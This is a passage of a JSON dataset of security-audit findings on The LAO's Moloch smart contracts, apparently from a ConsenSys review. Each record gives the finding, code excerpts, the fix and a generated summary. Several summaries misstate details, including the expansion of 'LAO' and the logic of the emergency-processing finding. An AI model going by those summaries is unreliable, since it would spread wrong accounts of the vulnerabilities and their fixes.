      "summary": "\nThe bug report discusses two main reasons for using the `bailout` function in the Pull Pattern update. The first reason is to kick someone out of the LAO and avoid them stealing user funds. The second reason is to address the “lost private key” problem. The issue is that it requires a lot of trust to the summoner and requires more time to kick the member out of the LAO. \n\nThe recommendation is to split these two intentions into two different mechanisms. The first is to implement the pull pattern for token transfers so that the kicked member won’t be able to block the `ragekick` and the LAO members would be able to kick anyone much quicker. The second is to have a longer time period for funds recovery in cases of lost private keys. This would allow for recovery without a preliminary kick and cover not only the `shares` and `loot`, but also tokens that should be withdrawn.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "The LAO",
      "source_link": "https://consensys.net/diligence/audits/2020/01/the-lao/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        "Shayan Eskandari",
        " Daniel Luca"
      ]
    },
    {
      "id": "13875",
      "title": "Whitelisted tokens limit ✓ Fixed",
      "impact": "HIGH",
      "content": "#### Resolution\n\n\n\nmitigated by having separate limits for number of whitelisted tokens (for non-zero balance and for zero balance) in [486f1b3](https://github.com/MolochVentures/moloch/commit/486f1b3e72c8e48f614c3b22a0220de63b5320bd) and follow up commits. That’s helpful because it’s much cheaper to process tokens with zero balance in the guild bank and you can have much more whitelisted tokens overall.\n\n\n\n```\nuint256 constant MAX\\_TOKEN\\_WHITELIST\\_COUNT = 400; // maximum number of whitelisted tokens\nuint256 constant MAX\\_TOKEN\\_GUILDBANK\\_COUNT = 200; // maximum number of tokens with non-zero balance in guildbank\nuint256 public totalGuildBankTokens = 0; // total tokens with non-zero balance in guild bank\n\n```\nIt should be noted that this is an estimated limit based on the [manual calculations](https://docs.google.com/spreadsheets/d/1LFtETGOsghYVJeTIF4v1L9cBB3IKu1LS9ypb7b-GtVY/edit#gid=0) and current OP code gas costs. DAO members should consider splitting the DAO into two if more than 100 tokens with non-zero balance are used in the DAO to be safe.\n\n\n\n\n#### Description\n\n\n`_ragequit` function is iterating over all whitelisted tokens:\n\n\n**contracts/Moloch.sol:L507-L513**\n\n\n\n```\nfor (uint256 i = 0; i < tokens.length; i++) {\n    uint256 amountToRagequit = fairShare(userTokenBalances[GUILD][tokens[i]], sharesAndLootToBurn, initialTotalSharesAndLoot);\n    // deliberately not using safemath here to keep overflows from preventing the function execution (which would break ragekicks)\n    // if a token overflows, it is because the supply was artificially inflated to oblivion, so we probably don't care about it anyways\n    userTokenBalances[GUILD][tokens[i]] -= amountToRagequit;\n    userTokenBalances[memberAddress][tokens[i]] += amountToRagequit;\n}\n\n```\nIf the number of tokens is too big, a transaction can run out of gas and all funds will be blocked forever. Ballpark estimation of this number is around 300 tokens based on the current OpCode gas costs and the block gas limit.\n\n\n#### Recommendation\n\n\nA simple solution would be just limiting the number of whitelisted tokens.\n\n\nIf the intention is to invest in many new tokens over time, and it’s not an option to limit the number of whitelisted tokens, it’s possible to add a function that removes tokens from the whitelist. For example, it’s possible to add a new type of proposals, that is used to vote on token removal if the balance of this token is zero. Before voting for that, shareholders should sell all the balance of that token.",
      "summary": "\nThis bug report covers a potential issue with the `_ragequit` function in the Moloch smart contract. If the number of whitelisted tokens is too large, the transaction can run out of gas and all funds will be blocked forever. The estimated limit for the number of whitelisted tokens is around 300 based on the current OpCode gas costs and the block gas limit. \n\nThe bug was mitigated by having separate limits for the number of whitelisted tokens with non-zero balance and for zero balance in the guild bank. This allows for more whitelisted tokens overall and is much cheaper to process. \n\nThe recommended solution is to limit the number of whitelisted tokens. Alternatively, a new type of proposal can be added that votes on token removal if the balance of the token is zero. Before voting for removal, shareholders should sell all the balance of the token.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "The LAO",
      "source_link": "https://consensys.net/diligence/audits/2020/01/the-lao/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        "Shayan Eskandari",
        " Daniel Luca"
      ]
    },
    {
      "id": "13874",
      "title": "Token Overflow might result in system halt or loss of funds ✓ Fixed",
      "impact": "HIGH",
      "content": "#### Resolution\n\n\n\nFixed in [fd2da6](https://github.com/MolochVentures/moloch/commit/fd2da66773c0cd09fa5db54c6e3ecd79042a170b), and [32ad9b](https://github.com/MolochVentures/moloch/commit/32ad9b9c6f05ac2d81c07b011da6ccaf2dae9b08) by allowing overflows in most balance calculations (e.g. `unsafeSubtractFromBalance` and `unsafeAddToBalance`).\nThis is to prevent system halt, however as mentioned above, in case of overflow the token balance will be incorrect for token holders and members should take that into account when approving future proposals.\n\n\n#### Description\n\n\nIf a token overflows, some functionality such as `processProposal`, `cancelProposal` will break due to safeMath reverts. The overflow could happen because the supply of the token was artificially inflated to oblivion.\n\n\nThis issue was pointed out by [Heiko Fisch](https://github.com/HeikoFisch) in Telegram chat.\n\n\n#### Examples\n\n\nAny function using `internalTransfer()` can result in an overflow:\n\n\n**contracts/Moloch.sol:L631-L634**\n\n\n\n```\nfunction max(uint256 x, uint256 y) internal pure returns (uint256) {\n    return x >= y ? x : y;\n}\n\n\n```\n#### Recommendation\n\n\nWe recommend to allow overflow for broken or malicious tokens. This is to prevent system halt or loss of funds. It should be noted that in case an overflow occurs, the balance of the token will be incorrect for all token holders in the system.\n\n\n`rageKick`, `rageQuit` were fixed by not using safeMath within the function code, however this fix is risky and not recommended, as there are other overflows in other functions that might still result in system halt or loss of funds.\n\n\nOne suggestion is having a function named `unsafeInternalTransfer()` which does not use safeMath for the cases that overflow should be allowed. This mainly adds better readability to the code.\n\n\n**It is still a risky fix and a better solution should be planned.**",
      "summary": "\nA bug was identified that could cause system halt or loss of funds if a token overflows due to an artificially inflated supply. This was pointed out by Heiko Fisch in the Telegram chat. The overflow could occur if any function used `internalTransfer()` and the `max()` function in contracts/Moloch.sol (lines 631-634). This was fixed by allowing overflows in most balance calculations (e.g. `unsafeSubtractFromBalance` and `unsafeAddToBalance`). However, this means that the token balance will be incorrect for token holders, and members should take this into account when approving future proposals. It is recommended to allow overflow for broken or malicious tokens, but this is a risky fix and a better solution should be planned. One suggestion is having a function named `unsafeInternalTransfer()` which does not use safeMath for the cases that overflow should be allowed, as this would add better readability to the code.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "The LAO",
      "source_link": "https://consensys.net/diligence/audits/2020/01/the-lao/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        "Shayan Eskandari",
        " Daniel Luca"
      ]
    },
    {
      "id": "13873",
      "title": "Emergency processing can be blocked ✓ Fixed in Pull Pattern",
      "impact": "HIGH",
      "content": "#### Resolution\n\n\n\nEmergency Processing no longer exists in the Pull Pattern update.\n\n\n#### Description\n\n\nThe main reason for the emergency processing mechanism is that there is a chance that some token transfers might be blocked. For example, a sender or a receiver is in the USDC blacklist. Emergency processing saves from this problem by not transferring tribute token back to the user (if there is some) and rejecting the proposal.\n\n\n**code/contracts/Moloch.sol:L407-L411**\n\n\n\n```\nif (!emergencyProcessing) {\n    require(\n        proposal.tributeToken.transfer(proposal.proposer, proposal.tributeOffered),\n        \"failing vote token transfer failed\"\n    );\n\n```\nThe problem is that there is still a deposit transfer back to the sponsor and it could be potentially blocked too. If that happens, proposal can’t be processed and the LAO is blocked.\n\n\n#### Recommendation\n\n\nImplementing pull pattern for all token withdrawals would solve the problem. The alternative solution would be to also keep the deposit tokens in the LAO, but that makes sponsoring the proposal more risky for the sponsor.",
      "summary": "\nA bug has been reported in the code/contracts/Moloch.sol, lines 407-411, which affects the emergency processing mechanism. This mechanism exists to prevent token transfers from being blocked, for example if a sender or a receiver is in the USDC blacklist. Currently, the emergency processing no longer exists in the Pull Pattern update, meaning there is a chance that token transfers could still be blocked. This would prevent proposals from being processed and the LAO from being able to function. To fix this, it is recommended to implement Pull Pattern for all token withdrawals. An alternative solution would be to keep the deposit tokens in the LAO, but this would make sponsoring the proposal more risky for the sponsor.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "The LAO",
      "source_link": "https://consensys.net/diligence/audits/2020/01/the-lao/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        "Shayan Eskandari",
        " Daniel Luca"
      ]
    },
    {
      "id": "13872",
      "title": "Creating proposal is not trustless ✓ Fixed in Pull Pattern",
      "impact": "HIGH",
      "content": "#### Resolution\n\n\n\nthis issue no longer exists in the Pull Pattern update, due to the fact that emergency processing and in function ERC20 transfers are removed.\n\n\n#### Description\n\n\nUsually, if someone submits a proposal and transfers some amount of tribute tokens, these tokens are transferred back if the proposal is rejected. But if the proposal is not processed before the emergency processing, these tokens will not be transferred back to the proposer. This might happen if a tribute token or a deposit token transfers are blocked.\n\n\n**code/contracts/Moloch.sol:L407-L411**\n\n\n\n```\nif (!emergencyProcessing) {\n    require(\n        proposal.tributeToken.transfer(proposal.proposer, proposal.tributeOffered),\n        \"failing vote token transfer failed\"\n    );\n\n```\nTokens are not completely lost in that case, they now belong to the LAO shareholders and they might try to return that money back. But that requires a lot of coordination and time and everyone who ragequits during that time will take a part of that tokens with them.\n\n\n#### Recommendation\n\n\nPull pattern for token transfers would solve the issue.",
      "summary": "\nThis bug report is about an issue with transferring tribute tokens when a proposal is rejected. If the proposal is not processed before the emergency processing, these tokens will not be transferred back to the proposer. This might happen if a tribute token or a deposit token transfers are blocked. The code/contracts/Moloch.sol:L407-L411 is the code that is affected. The tokens are not completely lost, but they now belong to the LAO shareholders, and they might try to return that money back. However, this requires coordination and time. The recommendation is to use a pull pattern for token transfers, which would solve the issue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "The LAO",
      "source_link": "https://consensys.net/diligence/audits/2020/01/the-lao/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        "Shayan Eskandari",
        " Daniel Luca"
      ]
    },
    {
      "id": "13871",
      "title": "safeRagequit makes you lose funds ✓ Fixed in Pull Pattern",
      "impact": "HIGH",
      "content": "#### Resolution\n\n\n\n`safeRagequit` no longer exists in the Pull Pattern update. `ragequit` is considered safe as there are no longer any ERC20 transfers in its code flow.\n\n\n#### Description\n\n\n`safeRagequit` and `ragequit` functions are used for withdrawing funds from the LAO. The difference between them is that `ragequit` function tries to withdraw all the allowed tokens and `safeRagequit` function withdraws only some subset of these tokens, defined by the user. It’s needed in case the user or GuildBank is blacklisted in some of the tokens and the transfer reverts. The problem is that even though you can quit in that case, you’ll lose the tokens that you exclude from the list.\n\n\nTo be precise, the tokens are not completely lost, they will belong to the LAO and can still potentially be transferred to the user who quit. But that requires a lot of trust, coordination, time and anyone can steal some part of these tokens.\n\n\n#### Recommendation\n\n\nImplementing pull pattern for token withdrawals should solve the issue. Users will be able to quit the LAO and burn their shares but still keep their tokens in the LAO’s contract for some time if they can’t withdraw them right now.",
      "summary": "\nThe bug report describes an issue with two functions, `safeRagequit` and `ragequit`, used for withdrawing funds from the LAO (Liquidity Autonomous Organization). `safeRagequit` withdraws only some subset of tokens defined by the user, while `ragequit` tries to withdraw all allowed tokens. The problem is that if a user or GuildBank is blacklisted in some of the tokens and the transfer reverts, the excluded tokens are not completely lost, but belong to the LAO and can still potentially be transferred to the user who quit. This requires a lot of trust, coordination, and time, and anyone can steal some part of these tokens. The recommendation is to implement a pull pattern for token withdrawals in order to solve the issue. This would allow users to quit the LAO and burn their shares but still keep their tokens in the LAO's contract for some time if they can't withdraw them right now.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "The LAO",
      "source_link": "https://consensys.net/diligence/audits/2020/01/the-lao/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sergii Kravchenko",
        "Shayan Eskandari",
        " Daniel Luca"
      ]
    }
  ]
}